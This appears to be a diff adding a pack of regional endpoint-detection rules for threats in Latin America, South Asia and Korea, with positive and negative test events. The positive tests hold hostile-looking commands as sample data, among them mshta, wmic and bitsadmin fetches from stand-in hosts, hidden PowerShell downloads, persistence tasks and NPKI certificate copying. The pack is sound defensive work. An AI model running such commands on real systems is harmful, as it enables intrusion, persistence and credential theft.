@@ -1,0 +1,6060 @@
+{
+ "pack": "regional",
+ "rules": [
+  {
+   "id": "rgn-latam-wmic-xsl-remote",
+   "name": "WMIC remote XSL stylesheet (Astaroth-style)",
+   "description": "wmic.exe invoked with /format: pointing at a remote URL, a loading technique publicly documented for Astaroth (Guildma) chains in Brazil and wider Latin America.",
+   "tactic": "Defense Evasion",
+   "technique": "T1220",
+   "technique_name": "XSL Script Processing",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\wmic.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/format:"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "http://",
+       "https://"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "astaroth",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic os get /format:\"https://evil.example/a.xsl\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic process list brief /format:table"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-bitsadmin-public-drop",
+   "name": "BITSAdmin transfer into Public or ProgramData",
+   "description": "bitsadmin /transfer downloading into a world-writable staging directory, commonly seen in Brazilian banking-trojan loaders.",
+   "tactic": "Command and Control",
+   "technique": "T1197",
+   "technique_name": "BITS Jobs",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\bitsadmin.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/transfer"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "banking-trojan",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+      "command": "bitsadmin /transfer j /download /priority foreground http://x.example/a.zip C:\\Users\\Public\\a.zip"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+      "command": "bitsadmin /list /allusers"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-extexport-offpath",
+   "name": "ExtExport.exe run outside Internet Explorer directories",
+   "description": "ExtExport.exe is a signed Internet Explorer helper that Guildma/Astaroth intrusions copy beside a malicious DLL for side-loading. Running it from user-writable folders is anomalous.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.002",
+   "technique_name": "T1574.002",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\extexport.exe"
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "astaroth",
+    "sideload"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\Public\\Libraries\\ExtExport.exe",
+      "command": "ExtExport.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Internet Explorer\\ExtExport.exe",
+      "command": "ExtExport.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-autoit-userdir",
+   "name": "AutoIt interpreter executed from user-writable path",
+   "description": "AutoIt3.exe or a renamed copy executing from ProgramData, Public or AppData, a packaging style reported for Metamorfo/Casbaneiro and Mispadu campaigns.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "any": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "patterns": [
+         "\\autoit3.exe",
+         "\\autoit3_x64.exe"
+        ]
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         ".au3",
+         ".a3x"
+        ]
+       }
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "metamorfo",
+    "autoit"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\ProgramData\\kb\\AutoIt3.exe",
+      "command": "AutoIt3.exe c:\\programdata\\kb\\run.au3"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe",
+      "command": "AutoIt3.exe build.au3"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-script-host-public-vbs",
+   "name": "Windows Script Host running script from Public or ProgramData",
+   "description": "wscript or cscript executing .vbs/.vbe/.js from a world-writable staging folder, the loader style reported across LATAM banking trojans.",
+   "tactic": "Execution",
+   "technique": "T1059.005",
+   "technique_name": "Visual Basic",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\wscript.exe",
+       "\\cscript.exe"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\.(vbs|vbe|js|jse|wsf)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "banking-trojan",
+    "script"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe C:\\Users\\Public\\Documents\\upd.vbs"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript.exe C:\\ops\\logon.vbs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-mshta-local-staged",
+   "name": "mshta executing a script staged in Public or ProgramData",
+   "description": "mshta.exe launching a local .hta/.vbs/.js from a world-writable path, a Casbaneiro/Metamorfo-style stage.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.005",
+   "technique_name": "Mshta",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\mshta.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "metamorfo",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta.exe C:\\Users\\Public\\a.hta"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta.exe C:\\Windows\\Help\\x.hta"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-msiexec-remote-quiet",
+   "name": "msiexec quiet install from a remote URL",
+   "description": "msiexec /i with an http(s) package in quiet mode, a delivery step shared by Metamorfo, Javali and Mekotio chains.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.007",
+   "technique_name": "Msiexec",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\msiexec.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/i\\s+\\\"?https?://"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/(q|qn|quiet|passive)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "banking-trojan",
+    "lolbin",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /i http://dl.example/inst.msi /qn"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /i C:\\setup\\tool.msi /qn"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-msbuild-project-userdir",
+   "name": "MSBuild compiling a project from a user-writable folder",
+   "description": "MSBuild.exe building a .proj/.csproj/.xml located in Public, ProgramData or Temp, an inline-task technique reported for BBTok and related Latin American loaders.",
+   "tactic": "Defense Evasion",
+   "technique": "T1127.001",
+   "technique_name": "MSBuild",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\msbuild.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\.(proj|csproj|vbproj|xml|targets)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "bbtok",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+      "command": "MSBuild.exe C:\\Users\\Public\\x.csproj"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Microsoft Visual Studio\\MSBuild.exe",
+      "command": "MSBuild.exe C:\\src\\app\\app.csproj /p:Configuration=Release"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-squirrel-remote-update",
+   "name": "Squirrel Update.exe pulling from a remote URL",
+   "description": "Squirrel's Update.exe with --update, --download or --install against an http URL has been abused as a trusted-looking downloader (reported for Coyote). Legitimate Electron updaters also use it, so this is an audit signal.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\update.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--(update|download|install)[= ]\\s*https?://"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "coyote",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\app\\Update.exe",
+      "command": "Update.exe --update=http://203.0.113.9/rel"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\app\\Update.exe",
+      "command": "Update.exe --processStart app.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-startup-url-file",
+   "name": "Internet shortcut dropped in the Startup folder",
+   "description": "A .url file created in the user Startup folder, a persistence style reported for Blind Eagle (APT-C-36) droppers.",
+   "tactic": "Persistence",
+   "technique": "T1547.009",
+   "technique_name": "Shortcut Modification",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "contains",
+      "pattern": "\\start menu\\programs\\startup\\"
+     },
+     {
+      "field": "path",
+      "op": "suffix",
+      "pattern": ".url"
+     },
+     {
+      "field": "operation",
+      "op": "equals",
+      "pattern": "create"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "blind-eagle",
+    "autostart"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.url",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-remcos-registry",
+   "name": "Remcos RAT registry configuration key",
+   "description": "Remcos stores its license and settings under HKCU\\Software\\Remcos-<id>. Remcos is a staple of Blind Eagle and many LATAM campaigns.",
+   "tactic": "Defense Evasion",
+   "technique": "T1112",
+   "technique_name": "Modify Registry",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\software\\\\remcos-[0-9a-z]{4,}"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "remcos",
+    "rat"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Remcos-A1B2C3",
+       "value_name": "licence",
+       "value_data": "ab12",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Remco",
+       "value_name": "x",
+       "value_data": "y",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-remcos-appdata-log",
+   "name": "Remcos keylogger data folder",
+   "description": "Remcos writes keystroke and screenshot data under %APPDATA%\\remcos\\.",
+   "tactic": "Collection",
+   "technique": "T1056.001",
+   "technique_name": "Keylogging",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "contains",
+      "pattern": "\\appdata\\roaming\\remcos\\"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "remcos",
+    "keylogger"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\remcos\\logs.dat",
+      "operation": "modify"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\remote\\logs.dat",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-asyncrat-schtask",
+   "name": "AsyncRAT-style logon task with highest privileges",
+   "description": "schtasks creating an on-logon, highest-run-level task pointing into AppData\\Roaming, the persistence default of AsyncRAT builds used by Blind Eagle.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\schtasks.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/create"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "onlogon"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/rl highest"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "\\appdata\\roaming\\"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "asyncrat",
+    "schtasks"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /f /sc onlogon /rl highest /tn \"Skype\" /tr \"C:\\Users\\ann\\AppData\\Roaming\\Skype.exe\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /sc daily /tn Backup /tr C:\\ops\\b.cmd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-latam-chrome-load-extension-userdir",
+   "name": "Browser launched with an extension loaded from a user-writable path",
+   "description": "chrome/msedge started with --load-extension pointing into AppData, ProgramData or Public, a banking-trojan technique for on-page fraud reported for Mekotio/Grandoreiro.",
+   "tactic": "Persistence",
+   "technique": "T1176",
+   "technique_name": "Software Extensions",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\chrome.exe",
+       "\\msedge.exe"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "--load-extension="
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "\\users\\public\\",
+       "\\programdata\\",
+       "\\appdata\\",
+       "\\temp\\"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "latam",
+    "mekotio",
+    "browser"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe --load-extension=C:\\Users\\Public\\ext"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe --profile-directory=Default"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sasia-schtask-mshta-remote",
+   "name": "Scheduled task launching mshta against a remote URL",
+   "description": "schtasks /create whose action is mshta with an http(s) URL, a persistence pattern publicly attributed to BITTER and other South Asian groups.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\schtasks.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "/create"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "mshta"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sasia",
+    "bitter",
+    "schtasks"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /sc minute /mo 15 /tn MicrosoftUpdate /tr \"mshta http://203.0.113.5/a.hta\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\schtasks.exe",
+      "command": "schtasks /create /sc minute /mo 15 /tn Check /tr C:\\ops\\check.cmd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sasia-rekeywiz-offpath",
+   "name": "rekeywiz.exe run outside System32 (SideCopy side-loading)",
+   "description": "SideCopy has side-loaded DUser.dll through a copied Credential Backup and Restore Wizard (rekeywiz.exe). The binary has no business outside System32.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.002",
+   "technique_name": "T1574.002",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\rekeywiz.exe"
+     },
+     {
+      "not": {
+       "field": "executable",
+       "op": "contains",
+       "patterns": [
+        "\\windows\\system32\\",
+        "\\windows\\syswow64\\"
+       ]
+      }
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sasia",
+    "sidecopy",
+    "sideload"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Roaming\\rekeywiz.exe",
+      "command": "rekeywiz.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\rekeywiz.exe",
+      "command": "rekeywiz.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sasia-mshta-raw-ip",
+   "name": "mshta fetching content from a raw IPv4 URL",
+   "description": "mshta with an http URL whose host is a bare IPv4 address, the delivery style reported for Gamaredon, SideWinder and several South Asian clusters.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.005",
+   "technique_name": "Mshta",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\mshta.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sasia",
+    "russia",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta http://198.51.100.7/doc.hta"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta https://intranet.corp.example/app.hta"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sasia-hh-decompile",
+   "name": "hh.exe decompiling a CHM file",
+   "description": "hh.exe -decompile unpacks CHM content to disk; CHM lures are used by Kimsuky and by South Asian groups such as Patchwork.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.001",
+   "technique_name": "Compiled HTML File",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\hh.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-decompile"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sasia",
+    "kr",
+    "chm",
+    "lolbin"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe -decompile C:\\Users\\ann\\AppData\\Local\\Temp\\x C:\\Users\\ann\\Downloads\\doc.chm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe C:\\Windows\\Help\\mui\\help.chm"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-sasia-chm-userdir",
+   "name": "CHM opened from a user-writable path",
+   "description": "hh.exe opening a .chm from Downloads, Temp, AppData or Public. CHM lures were used by Kimsuky, Patchwork and others; manuals are also legitimate so this is low severity.",
+   "tactic": "Execution",
+   "technique": "T1218.001",
+   "technique_name": "Compiled HTML File",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\hh.exe"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\\\(downloads|temp|appdata|users\\\\public)\\\\.*\\.chm"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "sasia",
+    "kr",
+    "chm",
+    "noisy-risk"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe C:\\Users\\ann\\Downloads\\invoice.chm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe C:\\Windows\\Help\\help.chm"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-hwp-spawns-shell",
+   "name": "Hancom Hangul (HWP) spawning a shell or script host",
+   "description": "hwp.exe starting cmd, PowerShell, a script host, mshta, rundll32 or regsvr32. Malicious HWP documents and EPS exploits are a signature Korean-language lure used by Kimsuky and ScarCruft.",
+   "tactic": "Execution",
+   "technique": "T1203",
+   "technique_name": "Exploitation for Client Execution",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "suffix",
+      "patterns": [
+       "\\hwp.exe",
+       "\\hword.exe"
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\cmd.exe",
+       "\\powershell.exe",
+       "\\pwsh.exe",
+       "\\wscript.exe",
+       "\\cscript.exe",
+       "\\mshta.exe",
+       "\\rundll32.exe",
+       "\\regsvr32.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "kimsuky",
+    "apt37",
+    "office"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c powershell -w hidden iwr http://x/a",
+      "parent_exe": "C:\\Program Files (x86)\\HNC\\Office 2020\\HOffice110\\Bin\\Hwp.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c dir",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-ghostscript-spawns-shell",
+   "name": "Ghostscript spawning a shell (Hangul EPS exploitation)",
+   "description": "gswin32c/gswin64c with a command interpreter child is the tail of Hangul EPS exploit chains reported against South Korean targets.",
+   "tactic": "Execution",
+   "technique": "T1203",
+   "technique_name": "Exploitation for Client Execution",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "suffix",
+      "patterns": [
+       "\\gswin32c.exe",
+       "\\gswin64c.exe"
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "\\cmd.exe",
+       "\\powershell.exe",
+       "\\wscript.exe",
+       "\\mshta.exe"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "apt37",
+    "exploit"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Program Files (x86)\\HNC\\Common\\gs\\gs9.21\\bin\\gswin32c.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c whoami",
+      "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-npki-collection",
+   "name": "Korean NPKI certificate folder being copied or archived",
+   "description": "A copy or archive command touching the NPKI certificate directory. Theft of NPKI signing certificates is documented for Kimsuky and Lazarus intrusions.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "\\npki"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(xcopy|robocopy|copy|7z|rar|winrar|compress-archive|tar)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "kimsuky",
+    "lazarus",
+    "credential"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\xcopy.exe",
+      "command": "xcopy C:\\Users\\ann\\AppData\\LocalLow\\NPKI C:\\Users\\Public\\n /e /i"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\xcopy.exe",
+      "command": "xcopy C:\\src C:\\bak /e /i"
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-appleseed-estsoft-regsvr32",
+   "name": "regsvr32 loading an ESTsoft-lookalike DLL from ProgramData",
+   "description": "AppleSeed-style persistence registers a DLL under ProgramData\\Software\\ESTsoft, mimicking the Korean ALYac vendor. The real product lives in Program Files.",
+   "tactic": "Persistence",
+   "technique": "T1218.010",
+   "technique_name": "Regsvr32",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "\\regsvr32.exe"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "\\programdata\\software\\estsoft\\"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "kimsuky",
+    "appleseed"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command": "regsvr32.exe /s C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\regsvr32.exe",
+      "command": "regsvr32.exe /s \"C:\\Program Files\\ESTsoft\\ALYac\\a.dll\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "rgn-kr-run-key-mshta-remote",
+   "name": "Run key launching mshta against a remote URL",
+   "description": "Autostart value invoking mshta with an http URL, the BabyShark/Kimsuky persistence pattern.",
+   "tactic": "Persistence",
+   "technique": "T1547.001",
+   "technique_name": "Registry Run Keys / Startup Folder",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "contains",
+      "pattern": "\\currentversion\\run"
+     },
+     {
+      "field": "value_data",
+      "op": "contains",
+      "pattern": "mshta"
+     },
+     {
+      "field": "value_data",
+      "op": "contains",
+      "pattern": "http"
+     }
+    ]
+   },
+   "tags": [
+    "regional",
+    "kr",
+    "kimsuky",
+    "babyshark",
+    "autostart"
+   ],
+   "batch": "regional-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+       "value_name": "OneDriveUpd",
+       "value_data": "mshta http://203.0.113.4/a.html",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+       "value_name": "OneDrive",
+       "value_data": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background",
